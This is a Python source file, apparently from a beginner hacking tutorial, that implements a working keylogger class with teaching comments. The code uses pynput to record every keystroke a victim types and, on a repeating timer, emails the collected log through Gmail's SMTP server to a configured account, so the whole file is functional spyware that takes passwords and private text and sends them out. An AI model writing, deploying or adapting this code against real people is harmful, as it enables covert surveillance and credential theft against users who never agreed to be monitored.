# we just need to import this class(key_log) 
# and set the fields for keylogger

#!usr/bin/env python
# killall python will stop all the python programs running
# we need to use self to use functions or attributes
import pynput.keyboard as pk
import threading, smtplib
# This library allows to control and monitor input devices
# keyboard in this case
# threading module will create threads

class Keylogger:

    def __init__(self, time_int, email, password):
        self.log = ""
        self.interval = time_int
        self.email = email
        self.password = password
        # here we are creating a constructor to initialize the feilds
        # self is by default
        # self represents the instance of the class.
        # By using the self keyword we can access the attributes and
        # methods of the class in python.
        # It binds the attributes with the given arguments.

    def append_to_log(self, string):
        self.log = self.log + string
        # here we will append the new arrived string to log

    def process_pressed(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)
        # this function will take the pressed key as argument and
        # save it in a global variable log and constantly updates it

    def report(self):
        # by adding\n\n we will jump the headers and
        # the log will be sent to the mail as text
        if self.log == "":
            pass
        else:
            self.send_mail(self.email, self.password, "\n\n" + self.log)
            self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()
        # on one thread main program will execute and on the other we will set a
        # timer which will send report after timer expires and reset the timer
        # and call the report function reccursively
        # this will be done using timer class
        # this problem arises because both tasks(logging and reporting)
        # is need to be run repeatedly which will put each other in loop

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        key_listen = pk.Listener(on_press=self.process_pressed)
        # listner is a class of pk which takes a call by function
        # and calls it on every key strike
        with key_listen:
            self.report()
            key_listen.join()
            # with is used to interact with unmanaged
            # stream of data eg. opening files or using listeners



